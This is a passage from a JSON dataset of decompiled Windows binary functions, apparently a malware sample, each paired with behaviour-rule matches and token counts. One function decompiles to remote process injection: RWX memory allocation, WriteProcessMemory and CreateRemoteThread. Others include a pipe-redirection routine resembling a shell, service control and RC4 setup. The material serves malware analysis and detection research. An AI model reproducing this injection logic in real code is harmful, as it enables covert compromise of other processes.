        "decompiled_code": "\nuint __cdecl fcn.000843e2(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack60 [4];\n    uint uStack56;\n    uint uStack52;\n    uchar auStack48 [16];\n    \n    uStack56 = 0x1b;\n    arg_ch = 0;\n    uStack52 = 0;\n    iVar1 = in_ECX + 4;\n    auStack48 = ZEXT816(0);\n    fcn.00083527(iVar1);\n    fcn.00083506(iVar1);\n    fcn.000834a5(iVar1);\n    fcn.00083527(iVar1);\n    if (*(in_ECX + 0x1c) != 0) {\n        do {\n            arg_8h_00 = fcn.00081862(auStack48, arg_ch);\n            fcn.00083527(arg_8h_00);\n            fcn.000858fb();\n            iVar1 = fcn.00081862(auStack60, arg_ch);\n            fcn.00083506(*(iVar1 + 0x10));\n            fcn.000858fb();\n            iVar1 = fcn.00081862(&stack0xffffffb8, arg_ch);\n            fcn.000834dd(*(iVar1 + 8), *(iVar1 + 0xc));\n            fcn.000858fb();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0x1c));\n    }\n    fcn.0008343f(arg_8h);\n    fcn.0008342b();\n    return arg_8h;\n}\n",
        "token_count": 388
    },
    "00086dce": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00086dce(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t uVar1;\n    uint var_5ch;\n    \n    fcn.00085cc2();\n    uVar1 = 0;\n    if (arg_8h != 0) {\n        do {\n            fcn.00085c1b(1);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_8h);\n    }\n    fcn.00085b75();\n    *(in_ECX + 0x14) = 0;\n    return;\n}\n",
        "token_count": 143
    },
    "0008ef92": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008ef92(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    var_4h = 0;\n    if (*in_ECX == 0) {\n        fcn.000833f3(&var_4h);\n    }\n    else {\n        iVar1 = fcn.0008eaae(arg_ch, &var_ch);\n        if (iVar1 != 0) {\n            arg_8h_00 = fcn.00082ca1(&arg_ch);\n            fcn.000831fd(arg_8h_00);\n            fcn.000858fb();\n        }\n        fcn.000833f3(&var_4h);\n    }\n    fcn.000858fb();\n    fcn.00082dff();\n    return arg_8h;\n}\n",
        "token_count": 234
    },
    "0008f953": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0008f953(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint extraout_ECX;\n    uint uStackY108;\n    uint uVar3;\n    uint *puVar4;\n    int32_t var_38h;\n    uint32_t var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_5h;\n    \n    *(arg_8h + 8) = 0;\n    *(arg_8h + 0xc) = 5;\n    *(arg_8h + 4) = 5;\n    fcn.000814d4();\n    if (*0x96d68 == 0) {\n        iVar2 = fcn.000859a9();\n        if (iVar2 == 0) {\n            *0x96d68 = 0;\n        }\n        else {\n            *0x96d68 = fcn.000905e9(extraout_ECX);\n        }\n    }\n    fcn.00090354(&var_38h);\n    var_10h = 0;\n    if (var_30h != 0) {\n        do {\n            uVar1 = var_10h;\n            var_28h = 0;\n            var_5h._0_1_ = var_10h < var_30h;\n            fcn.000856f9();\n            iVar2 = var_38h;\n            puVar4 = &var_ch;\n            uVar3 = **(var_38h + uVar1 * 4);\n            fcn.00083185(uVar3);\n            arg_8h_00 = fcn.00082e63(uVar3);\n            fcn.000831fd(arg_8h_00);\n            fcn.000858fb(arg_8h_00, uVar3, puVar4);\n            var_ch = 0;\n            fcn.000858fb();\n            fcn.000856f9();\n            var_24h = *(*(iVar2 + uVar1 * 4) + 8);\n            var_18h = var_24h;\n            fcn.000856f9();\n            uVar3 = *(*(iVar2 + uVar1 * 4) + 0x10);\n            var_20h = uVar3;\n            fcn.000856f9();\n            var_1ch = *(*(iVar2 + uVar1 * 4) + 0x14);\n            puVar4 = &var_28h;\n            fcn.000833f3(puVar4);\n            fcn.000813d3(puVar4, uStackY108, var_18h, uVar3);\n            fcn.000858fb();\n            var_10h = var_10h + 1;\n        } while (var_10h < var_30h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 710
    },
    "00081d11": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00081d11(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = *arg_8h;\n    in_ECX[1] = arg_8h[1];\n    fcn.00082e12(arg_8h + 2);\n    fcn.000833f3(arg_8h + 4);\n    in_ECX[5] = arg_8h[5];\n    in_ECX[6] = arg_8h[6];\n    fcn.000833f3(arg_8h + 7);\n    in_ECX[8] = arg_8h[8];\n    fcn.000833f3(arg_8h + 9);\n    fcn.000833f3(arg_8h + 10);\n    in_ECX[0xb] = arg_8h[0xb];\n    fcn.000833f3(arg_8h + 0xc);\n    in_ECX[0xd] = arg_8h[0xd];\n    in_ECX[0xe] = arg_8h[0xe];\n    fcn.00082e12(arg_8h + 0xf);\n    return;\n}\n",
        "token_count": 268
    },
    "0008230d": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0008230d(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = *arg_8h;\n    in_ECX[1] = arg_8h[1];\n    fcn.00082c65(arg_8h + 2);\n    fcn.000831fd(arg_8h + 4);\n    in_ECX[5] = arg_8h[5];\n    in_ECX[6] = arg_8h[6];\n    fcn.000831fd(arg_8h + 7);\n    in_ECX[8] = arg_8h[8];\n    fcn.000831fd(arg_8h + 9);\n    fcn.000831fd(arg_8h + 10);\n    in_ECX[0xb] = arg_8h[0xb];\n    fcn.000831fd(arg_8h + 0xc);\n    in_ECX[0xd] = arg_8h[0xd];\n    in_ECX[0xe] = arg_8h[0xe];\n    fcn.00082c65(arg_8h + 0xf);\n    return;\n}\n",
        "token_count": 263
    },
    "00083c60": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00083c60(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    arg_8h_00 = *(in_ECX + 4);\n    fcn.00083506(arg_8h_00);\n    fcn.00083527(arg_8h_00);\n    fcn.00083506(arg_8h_00);\n    fcn.00083506(arg_8h_00);\n    fcn.00083506(arg_8h_00);\n    fcn.00083506(arg_8h_00);\n    fcn.000834c0(arg_8h_00);\n    fcn.00083506(arg_8h_00);\n    fcn.0008343f(arg_8h_00);\n    fcn.0008342b();\n    return arg_8h;\n}\n",
        "token_count": 218
    },
    "00083ce3": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00083ce3(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint *in_ECX;\n    \n    in_ECX[1] = arg_8h;\n    *in_ECX = 0x925ac;\n    fcn.000833f3(&arg_ch);\n    in_ECX[3] = arg_10h;\n    in_ECX[4] = arg_14h;\n    in_ECX[5] = arg_18h;\n    in_ECX[6] = arg_1ch;\n    in_ECX[7] = arg_20h;\n    in_ECX[8] = arg_24h;\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 195
    },
    "00083d4c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00083d4c(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    \n    fcn.00082d5a(*(in_ECX + 4), *(in_ECX + 8));\n    arg_8h_00 = *(in_ECX + 0xc);\n    fcn.00083506(arg_8h_00);\n    fcn.00083506(arg_8h_00);\n    fcn.00083506(arg_8h_00);\n    fcn.00083506(arg_8h_00);\n    fcn.00083527(arg_8h_00);\n    fcn.00083527(arg_8h_00);\n    fcn.00083506(arg_8h_00);\n    fcn.0008343f(arg_8h_00);\n    fcn.0008342b();\n    return arg_8h;\n}\n",
        "token_count": 237
    },
    "00083e02": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00083e02(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x925bc;\n    fcn.00082e12(&arg_8h);\n    in_ECX[3] = arg_10h;\n    in_ECX[4] = arg_14h;\n    in_ECX[5] = arg_18h;\n    in_ECX[6] = arg_1ch;\n    fcn.000833f3(&arg_20h);\n    fcn.000833f3(&arg_24h);\n    in_ECX[9] = arg_28h;\n    fcn.00082dff();\n    fcn.000858fb();\n    arg_20h = 0;\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 232
    },
    "000844ca": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.000844ca(uint *param_1)\n\n{\n    int32_t in_stack_fffffff8;\n    int32_t iVar1;\n    \n    *param_1 = 0x925f4;\n    iVar1 = param_1[5];\n    if (iVar1 != 0) {\n        fcn.00081a75(iVar1);\n        in_stack_fffffff8 = iVar1;\n    }\n    param_1[5] = 0;\n    param_1[7] = 0;\n    param_1[6] = 0;\n    fcn.000858fb(in_stack_fffffff8);\n    param_1[4] = 0;\n    fcn.000858fb();\n    param_1[1] = 0;\n    return;\n}\n",
        "token_count": 172
    },
    "0008536c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "initialize Winsock library"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0008536c(int32_t param_1)\n\n{\n    uint extraout_ECX;\n    \n    fcn.00082f89();\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x30) = 0;\n    *(param_1 + 0x34) = 0;\n    fcn.0008ddc0(extraout_ECX);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(2, param_1 + 0x38);\n    *(param_1 + 0xc) = 0xffffffff;\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x24) = 0;\n    return param_1;\n}\n",
        "token_count": 190
    },
    "00085cc2": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "hash data using SHA1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00085cc2(uint *param_1)\n\n{\n    param_1[6] = 0;\n    param_1[5] = 0;\n    *param_1 = 0x67452301;\n    param_1[1] = 0xefcdab89;\n    param_1[2] = 0x98badcfe;\n    param_1[3] = 0x10325476;\n    param_1[4] = 0xc3d2e1f0;\n    return;\n}\n",
        "token_count": 122
    },
    "000872de": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000872de(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint *in_ECX;\n    uint *puVar3;\n    uint extraout_ECX;\n    uint uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    \n    uVar4 = 0;\n    iVar5 = 5;\n    in_ECX[4] = 5;\n    in_ECX[2] = 5;\n    in_ECX[3] = 0;\n    puVar1 = fcn.000859a9();\n    if (puVar1 == NULL) {\n        puVar3 = NULL;\n    }\n    else {\n        puVar3 = puVar1 + 1;\n        *puVar1 = 5;\n        puVar1 = puVar3;\n        do {\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            iVar5 = iVar5 + -1;\n            puVar1 = puVar1 + 2;\n        } while (iVar5 != 0);\n    }\n    in_ECX[1] = puVar3;\n    fcn.0008d9f6();\n    in_ECX[0xb] = 0xffff;\n    fcn.000831fd(&arg_8h);\n    uVar6 = 0x80000000;\n    uVar7 = extraout_ECX;\n    iVar5 = fcn.0008dcba(0x80000000);\n    if (iVar5 != 0) {\n        uVar2 = in_ECX[10] / 0xffff;\n        in_ECX[0xc] = uVar2;\n        if (in_ECX[10] % 0xffff != 0) {\n            in_ECX[0xc] = uVar2 + 1;\n        }\n        uVar4 = 1;\n    }\n    *in_ECX = uVar4;\n    fcn.000858fb(uVar6, uVar7);\n    return;\n}\n",
        "token_count": 452
    },
    "0008ebb6": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0008ebb6(int32_t *param_1)\n\n{\n    uint unaff_ESI;\n    \n    if (*param_1 != 0) {\n        fcn.0008ea99();\n    }\n    fcn.0008566c();\n    fcn.000858fb();\n    param_1[8] = 0;\n    fcn.000858fb();\n    param_1[7] = 0;\n    fcn.000858fb();\n    param_1[6] = 0;\n    fcn.000858fb();\n    param_1[5] = 0;\n    fcn.000858fb();\n    param_1[4] = 0;\n    fcn.0008ea99();\n    if (*param_1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*param_1, unaff_ESI);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 212
    },
    "0008ef3c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008ef3c(uint *param_1)\n\n{\n    uint extraout_EDX;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    param_1[8] = 0;\n    fcn.00085647();\n    return extraout_EDX;\n}\n",
        "token_count": 118
    },
    "000902dc": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.000902dc(uint *param_1)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00085847();\n    *param_1 = uVar1;\n    uVar1 = fcn.00085847();\n    param_1[1] = uVar1;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    return param_1;\n}\n",
        "token_count": 122
    },
    "000905e9": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.000905e9(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    uint32_t arg_8h;\n    \n    arg_8h = 0;\n    param_1[4] = 5;\n    param_1[2] = 5;\n    param_1[3] = 0;\n    uVar1 = fcn.000859a9();\n    param_1[1] = uVar1;\n    param_1[5] = 0x96d60;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    param_1[8] = 0;\n    param_1[9] = 0;\n    param_1[10] = 0;\n    param_1[0xb] = 0;\n    param_1[0xc] = 0;\n    param_1[0xd] = 0;\n    iVar2 = fcn.000859a9();\n    if (iVar2 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.0008fd7f(extraout_ECX);\n    }\n    *param_1 = uVar1;\n    fcn.00090024();\n    if (param_1[3] != 0) {\n        do {\n            fcn.0008fe4f(arg_8h);\n            arg_8h = arg_8h + 1;\n        } while (arg_8h < param_1[3]);\n    }\n    return param_1;\n}\n",
        "token_count": 364
    },
    "00081e8e": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00081e8e(uint lpStartAddress, uint lpParameter)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, lpStartAddress, lpParameter, 0, in_ECX + 1);\n    *in_ECX = iVar1;\n    return iVar1 != 0;\n}\n",
        "token_count": 94
    },
    "00087167": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00087167(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint uVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint lpThreadAttributes;\n    \n    lpThreadAttributes = 0;\n    piVar1 = fcn.00085878();\n    piVar1[3] = *(arg_ch + 4);\n    fcn.000831fd(arg_ch + 8);\n    piVar1[1] = arg_8h;\n    *piVar1 = in_ECX;\n    uVar2 = *(arg_ch + 4);\n    fcn.0008dd97();\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00086e11, piVar1, 0, &lpThreadAttributes);\n    fcn.00081dfe(arg_8h_00);\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*(in_ECX + 0x10), arg_8h_00, uVar2, piVar1);\n    return;\n}\n",
        "token_count": 275
    },
    "0008caf0": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008caf0(uint arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint extraout_ECX;\n    uint uVar5;\n    uint arg_10h;\n    uint arg_14h;\n    uint *arg_8h_00;\n    uint lpPipeAttributes;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint hReadPipe;\n    uint hWritePipe;\n    \n    fcn.0008ca7e();\n    hReadPipe = 0;\n    var_ch = 0;\n    hWritePipe = 0;\n    uVar5 = 1;\n    var_10h = 0;\n    var_14h = 0;\n    var_1ch = 0;\n    lpPipeAttributes = 0xc;\n    var_18h = 1;\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreatePipe)(&hReadPipe, &hWritePipe, &lpPipeAttributes, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcess;\n    if (iVar3 != 0) {\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(&var_ch, 0, 1, 2);\n        uVar4 = (*pcVar1)(hWritePipe, uVar4);\n        pcVar2 = _sym.imp.KERNEL32.dll_DuplicateHandle;\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar4);\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_CreatePipe)(&var_14h, &var_10h, &lpPipeAttributes, 0);\n            if (iVar3 != 0) {\n                uVar4 = (*pcVar1)(0x96580, 0, 0, 2);\n                uVar4 = (*pcVar1)(hReadPipe, uVar4);\n                iVar3 = (*pcVar2)(uVar4);\n                if (iVar3 != 0) {\n                    uVar4 = (*pcVar1)(0x96584, 0, 0, 2);\n                    uVar4 = (*pcVar1)(var_10h, uVar4);\n                    iVar3 = (*pcVar2)(uVar4);\n                    if (iVar3 != 0) {\n                        fcn.0008cc81();\n                        fcn.0008cc81();\n                        arg_8h_00 = &arg_8h;\n                        uVar4 = extraout_ECX;\n                        arg_10h = hWritePipe;\n                        arg_14h = var_14h;\n                        fcn.000833f3(arg_8h_00);\n                        iVar3 = fcn.0008c88e(arg_8h_00, uVar4, arg_10h, arg_14h);\n                        if (iVar3 != 0) {\n                            fcn.0008cc81();\n                            fcn.0008cc81();\n                            fcn.0008cc81();\n                            *0x96588 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 1, 0, 0);\n                            *0x9658c = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0008c927, 0x96578, 0, 0x96590);\n                            if (*0x9658c != 0) goto code_r0x0008cc70;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.0008cc81();\n    fcn.0008cc81();\n    fcn.0008cc81();\n    fcn.0008cc81();\n    fcn.0008cc81();\n    fcn.0008ca7e();\n    uVar5 = 0;\ncode_r0x0008cc70:\n    fcn.000858fb();\n    return uVar5;\n}\n",
        "token_count": 895
    },
    "0008d19d": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008d19d(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0008d191();\n    if ((iVar1 == 0) || (param_1 == 0)) {\n        fcn.000810c1(iVar1);\n        uVar2 = 0;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(iVar1, param_1);\n        *(iVar1 + 0x104) = param_2;\n        (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0008ce39, iVar1, 0, 0);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 181
    },
    "0008f6ed": {
        "rules": [
            "create thread",
            "allocate memory",
            "allocate RW memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "open process",
            "write process memory",
            "inject thread",
            "spawn thread to RWX shellcode"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0008f6ed(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_10ch;\n    uint var_108h;\n    uint lpflOldProtect;\n    uint hProcess;\n    \n    uVar3 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0, param_2);\n    hProcess = uVar3;\n    var_10ch = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    uVar4 = fcn.000810ad(0xff);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, uVar4, 0xff);\n    fcn.00081114(&var_108h, uVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_VirtualAllocEx;\n    iVar5 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(uVar3, 0, 0x800, 0x3000, 0x40);\n    pcVar1 = _sym.imp.KERNEL32.dll_WriteProcessMemory;\n    (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(uVar3, iVar5, 0x96178, 0x800, 0);\n    (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(hProcess, iVar5, 0x800, 0x40, &lpflOldProtect);\n    uVar3 = (*pcVar2)(hProcess, 0, 0x103, 0x3000, 4);\n    (*pcVar1)(hProcess, uVar3, &var_10ch, 0x103, 0);\n    *0x967b4 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(hProcess, 0, 0, iVar5 + 0x10e, uVar3, 0, 0);\n    return;\n}\n",
        "token_count": 447
    },
    "0008b64d": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008b64d(uint *lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    uVar5 = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(iVar2, *lpServiceName, 0x10);\n    if (iVar3 == 0) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return 0;\n    }\n    iVar4 = (*_sym.imp.ADVAPI32.dll_StartServiceW)(iVar3, 0, 0);\n    if (iVar4 == 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar4 != 0x420) goto code_r0x0008b6bd;\n        (*_sym.imp.KERNEL32.dll_Sleep)(2000);\n        iVar4 = (*_sym.imp.ADVAPI32.dll_StartServiceW)(iVar3, 0, 0);\n        if (iVar4 == 0) goto code_r0x0008b6bd;\n    }\n    uVar5 = 1;\ncode_r0x0008b6bd:\n    pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    (*pcVar1)(iVar3);\n    return uVar5;\n}\n",
        "token_count": 375
    },
    "0008d8bb": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0008d8bb(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*param_1, 0xffffffff);\n    return iVar1 == 0;\n}\n",
        "token_count": 62
    },
    "0008dd97": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0008dd97(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*param_1, 0xffffffff);\n    return iVar1 == 0;\n}\n",
        "token_count": 61
    },
    "00082505": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00082505(uint param_1, int32_t param_2)\n\n{\n    uint lpFile;\n    \n    if (*(param_2 + 4) == 0) {\n        fcn.000833f3(param_2 + 8);\n        (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, 0x92468, param_1, 0, 0, 5);\n        fcn.000858fb();\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00083567": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00083567(uint arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = arg_8h;\n    in_ECX[1] = 0;\n    in_ECX[2] = 0;\n    in_ECX[3] = 0;\n    in_ECX[4] = 0;\n    in_ECX[5] = 0;\n    return;\n}\n",
        "token_count": 95
    },
    "000844f4": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000844f4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x925f4;\n    fcn.000833f3(&arg_8h);\n    in_ECX[2] = arg_ch;\n    *(in_ECX + 3) = arg_10h;\n    fcn.000833f3(&arg_14h);\n    fcn.00081301(&arg_18h);\n    fcn.000858fb();\n    arg_14h = 0;\n    fcn.000858fb();\n    arg_8h = 0;\n    if (arg_18h != 0) {\n        fcn.00081a75(arg_18h);\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "00085878": {
        "rules": [
            "allocate memory",
            "allocate RW memory"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00085878(uint param_1)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, param_1, 0x3000, 4);\n    fcn.00085966(param_1);\n    return uVar1;\n}\n",
        "token_count": 73
    },
    "0008590a": {
        "rules": [
            "allocate memory",
            "allocate RW memory"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0008590a(uint param_1)\n\n{\n    (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, param_1, 0x3000, 4);\n    return;\n}\n",
        "token_count": 49
    },
    "00085b00": {
        "rules": [
            "encrypt data using RC4 KSA/c6eee0698c4b4bd09944ca66a2e4c269"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00085b00(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_108h;\n    uint var_8h;\n    \n    fcn.00082e12(&arg_10h);\n    iVar1 = 0;\n    do {\n        *(&var_108h + iVar1) = iVar1;\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x100);\n    fcn.00085a64(arg_ch);\n    fcn.000859f7(arg_14h);\n    fcn.00082e12(&arg_10h);\n    fcn.00082dff();\n    fcn.00082dff();\n    fcn.00082dff();\n    return;\n}\n",
        "token_count": 183
    },
    "0008f5c8": {
        "rules": [
            "create or open file",
            "get file size",
            "read file on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008f5c8(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpNumberOfBytesRead;\n    \n    lpNumberOfBytesRead = param_1;\n    uVar1 = fcn.000810ad(0x400000);\n    lpNumberOfBytesRead = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)(param_1, 0x80000000, 0, 0, 3, 0x80, 0);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetFileSize)(uVar2, 0);\n    *param_2 = uVar3;\n    (*_sym.imp.KERNEL32.dll_ReadFile)(uVar2, uVar1, uVar3, &lpNumberOfBytesRead, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n    return uVar1;\n}\n",
        "token_count": 221
    },
